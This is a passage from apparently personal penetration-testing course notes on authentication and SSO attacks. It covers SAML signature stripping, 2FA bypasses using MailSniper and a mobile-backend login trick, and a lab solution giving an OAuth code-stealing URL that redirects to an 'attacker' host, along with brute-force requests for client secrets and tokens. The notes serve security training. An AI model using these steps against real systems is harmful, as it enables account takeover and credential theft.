+<p>An attacker may interfere during step 5 in the SAML Workflow and tamper with the SAML response sent to the service provider (SP). Values of the assertions released by IDP may be replaced this way.</p>
+
+<ul>
+  <li>An insecure SAML implementation may not verify the signature, allowing account hijacking</li>
+</ul>
+
+<p>An XML canonicalization transform is employed while signing the XML document, to produce the identical dignature For logically or semantically similar documents.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://developer.okta.com/blog/2018/02/27/a-breakdown-of-the-new-saml-authentication-bypass-vulnerability#cryptographic-signing-issues
+</code></pre></div></div>
+<p><img src="/assets/images/posts/ewptx/91.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="saml-attack-scenario">SAML Attack Scenario</h3>
+<p>Suppose that we are assessing a SAML implementation</p>
+
+<p>We want to check if an attacker is able to successfully tamper with the SAML response sent to the service provider (SP). In essence, we want to check if an attacker can replace the values of the assertions released by the IDP.</p>
+
+<p><img src="/assets/images/posts/ewptx/92.png" alt="Alt text" class="align-center" /></p>
+
+<p>So, we copy the SAML Response (using BURP)</p>
+
+<p>and programmatically change the username in the XML to one of an identified admin. The attack was not successful</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invalid Signature on SAML Response
+</code></pre></div></div>
+
+<p>Does this mean that the SAML implementation is secure? Lets try performing a signature stripping attack before saying so.</p>
+
+<p>During signature stripping attacks against SAML, we simply remove the value of SignatureValue (the tag remains)</p>
+
+<ul>
+  <li>All we have to do is encode everything again and submit our crafted SAML Response</li>
+  <li>To our surprise, the remote server accepted our crafted request letting us log in as the targeted admin user</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/93.png" alt="Alt text" class="align-center" /></p>
+
+<blockquote>
+  <p>Have signature strpping attacks in mind, when assessing SAML implementations</p>
+</blockquote>
+
+<h3 id="resources">Resources</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- http://www.economyofmechanism.com/github-saml
+- https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e
+# its a BURP extension 
+</code></pre></div></div>
+
+<h2 id="common-2fa-bypasses">Common 2FA Bypasses</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Brute Force (when a secret of limited length is utilized)
+- Less common interfaces (mobile app, XMLRPC, API instead of web)
+- Forced Browsing
+- Predictable / Reusable Tokens
+</code></pre></div></div>
+
+<h3 id="less-common-interfaces">Less common interfaces</h3>
+
+<ol>
+  <li>How attackers usually bypass 2FA during MS Exchange attacks</li>
+  <li>How we were able to bypass the 2FA implementation of a stock/insurance management website</li>
+</ol>
+
+<h3 id="2fa-bypass-scenario-1">2FA Bypass Scenario 1</h3>
+<p>Exchange Web Services (EWS) is a remote access protocol</p>
+
+<ul>
+  <li>Its essentially SOAP over HTTP is used prevalently across applications, Windows mobile devices etc., and especially in newer versions of Exchange</li>
+</ul>
+
+<p>Such as attack against Exchange can be performed using the MailSniper tool</p>
+
+<p>→  https://github.com/dafthack/MailSniper</p>
+
+<p>// after identifying valid credentials</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\MailSniper.ps1</span><span class="w">
+</span><span class="n">Invoke-SelfSearch</span><span class="w"> </span><span class="nt">-Mailbox</span><span class="w"> </span><span class="nx">target</span><span class="err">@</span><span class="nx">domain.com</span><span class="w"> </span><span class="nt">-ExchHostname</span><span class="w"> </span><span class="nx">mail.domain.com</span><span class="w"> </span><span class="nt">-remote</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Trying the above tool on our testing domain, <strong>ELS</strong>, against the 2FA protected JeremyDoyle@els.local account returned the following.</li>
+  <li>Access to the users mailbox was achieved using only the identified credentials.</li>
+  <li>2FA was successfully subverted</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/94.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="2fa-bypass-scenario-2">2FA Bypass Scenario 2</h3>
+<p>During an external pentest, we came across a 2FA implementation on a web application that was related to stock/insurance management. As part of the assessment, we tried to bypass the 2FA implementation by leveraging the fact that the mobile <strong>channel</strong> didnt offer a 2FA option</p>
+
+<p>A malicious non-2FA user somehow find a 2FA-users credentials (For example through a social engineering attack)</p>
+
+<ul>
+  <li>The malicious user wants to login, using the acquired credentials, through the web app and not through the mobile app since the web app has additional functionality.</li>
+  <li>To achieve that he will have to find a way to bypass the 2FA mechanism in place</li>
+</ul>
+
+<h4 id="step-by-step">Step by Step</h4>
+<ol>
+  <li>We logged in through the mobile application as a non-2FA user (the attacker), wrote down the encrypted CSRF token For later use and kept the session alive</li>
+</ol>
+
+<p><img src="/assets/images/posts/ewptx/95.png" alt="Alt text" class="align-center" /></p>
+
+<ol>
+  <li>We initiated a login sequence as the 2FA user, whose credentials were acquired, through the web app but manipulated the login sequence requests so that they were processed through the mobile applications backend.</li>
+</ol>
+
+<ul>
+  <li>During the above mentioned login sequence manipulation steps we used the cookie values supplied by the web app backend</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/96.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/ewptx/97.png" alt="Alt text" class="align-center" /></p>
+
+<ol>
+  <li>We performed a POST request through the browser requesting</li>
+</ol>
+
+<ul>
+  <li>https://uat.xxxx.com/xxxParticipant/mobile/services/initial_load.htm:ENC=[attacker CSRF token]</li>
+  <li>using the CSRF token of the non-2FA user (the attacker) and the 2FA users cookies, as mentioned above.</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/98.png" alt="Alt text" class="align-center" /></p>
+
+<ol>
+  <li>The web app responded with a 403 Authorization error message, twice.</li>
+</ol>
+
+<p><img src="/assets/images/posts/ewptx/99.png" alt="Alt text" class="align-center" /></p>
+
+<ol>
+  <li>We performed a GET request through the browser requesting</li>
+</ol>
+
+<ul>
+  <li>https://uat.xxxx.com/xxxParticipant</li>
+  <li>And we were finally able to browser through the web app as the 2FA user bypassing the 2FA mechanism in place.</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/100.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="lab">Lab</h2>
+
+<p>Network Configuration</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- The target application can be found at http://gallery:3005
+- The username is koen and the password is password.
+</code></pre></div></div>
+
+<h3 id="tasks">Tasks</h3>
+
+<p>Task 1. Create a code stealing PoC:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Craft an URL that can be sent to a victim in order to steal the authorization code once he/she logs in into the /oauth endpoint. 
+- You can use the following data: the response type is "code", the scope is "view_gallery" and the client_id is "photoprint".
+</code></pre></div></div>
+
+<p>Task 2. Use the acquired code to bruteforce the client secret:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Use a POST request to the /token endpoint in order to bruteforce the  client secret. 
+- Consult with OAuth's documentation to recreate the  request. The grant type is "authorization_code"
+</code></pre></div></div>
+<p>Task 3. Discover another token vulnerability:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Discover another vulnerability by abusing the /photos/me?access_token= endpoint.
+</code></pre></div></div>
+
+<h3 id="solutions">Solutions</h3>
+<p>Below, you can find solutions for each task. Remember though, that  you can follow your own strategy, which may be different from the one  explained in the following lab.</p>
+
+<p>Task 1. Create a code stealing PoC</p>
+
+<p>Based on OAuth’s documentation available on https://tools.ietf.org/html/rfc6749 you can construct the following GET request. Note that you have to be logged out upon visiting this URL.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://gallery:3005/oauth/authorize?response_type=code&amp;redirect_uri=http%3A%2F%2Fattacker%2Fcallback&amp;scope=view_gallery&amp;client_id=photoprint
+</code></pre></div></div>
+
+<p>Upon logging in, there is a <strong>consent screen</strong>, which has to be accepted, just like a regular login via OAuth.</p>
+
+<p>Then, the user is redirected to the <strong>attacker</strong> website with the  authorization code in the callback value. Any user that is sent the  above URL and will log in via it, will make a request to the attacker  website disclosing the authorization code.</p>
+
+<p>The underlying vulnerability is an unvalidated redirection.</p>
+
+<p>Task 2. Use the acquired code to bruteforce the client secret</p>
+
+<p>Based on a sample Token request (https://auth0.com/docs/api-auth/tutorials/authorization-code-grant) you can construct the following POST request.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /token HTTP/1.1
+Host: gallery:3005
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 137
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+redirect_uri=http%3A%2F%2Fgallery%3A3005%2Fcallback&amp;grant_type=authorization_code&amp;client_id=photoprint&amp;client_secret=§guess§&amp;code=44438Note: 
+</code></pre></div></div>
+
+<ul>
+  <li>Copy-pasting the above request may result in  formatting issues that will cause the HTTP request to be malformed.</li>
+  <li>The  best way to reproduce that request is to log in as described in the  manual (by obtaining the first code), capture the request using Burp and  send it to Repeater.</li>
+  <li>Using Burp Intruder and a wordlist (we used Rockyou-10 available here) you can bruteforce the client secret.</li>
+</ul>
+
+<p>After starting the attack, soon we realize that the client secret is <strong>secret</strong>.</p>
+
+<p>In the Repeater window:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /token HTTP/1.1
+Host: gallery:3005
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 136
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+redirect_uri=http%3A%2F%2Fgallery%3A3005%2Fcallback&amp;grant_type=authorization_code&amp;client_id=photoprint&amp;client_secret=secret&amp;code=44438
+Note: Specify the code that you received in the response.  
+The response access token can now be supplied to the /photos/me?access_token= endpoint.
+GET /photos/me?access_token=35580 HTTP/1.1
+Host: gallery:3005
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre></div></div>
+
+<blockquote>
+  <p>[Note] Make sure to replace the access code in the above request with the one you get back from the request before this one.</p>
+</blockquote>
+
+<p>Task 3. Discover another token vulnerability</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># At /photos/me?access_token=[code] you are able to bruteforce the valid token. This will require the following Burp Intruder configuration:  
+
+GET /photos/me?access_token=§§ HTTP/1.1
+Host: gallery:3005
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre></div></div>
+
+<blockquote>
+  <p>This way, an attacker is able to compromise active tokens via  bruteforce in an unlimited way.</p>
+</blockquote>
+
+<blockquote>
+  <p>[Note] In a real application there  might be multiple active tokens. As we have just one active token, the  time for bruteforcing it might be much longer.</p>
+</blockquote>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#advanced" class="page__taxonomy-item" rel="tag">advanced</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#bypass" class="page__taxonomy-item" rel="tag">bypass</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ewptx" class="page__taxonomy-item" rel="tag">ewptx</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-05T00:00:00+06:00">December 5, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=13+-+Authentication+%26+SSO%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fauthenticationsso%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fauthenticationsso%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fauthenticationsso%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/ewptx/crypto/" class="pagination--pager" title="12 - Attacking Crypto
+">Previous</a>
+    
+    
+      <a href="/notes/ewptx/apiscloud/" class="pagination--pager" title="14 - APIs &amp; Cloud Apps
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
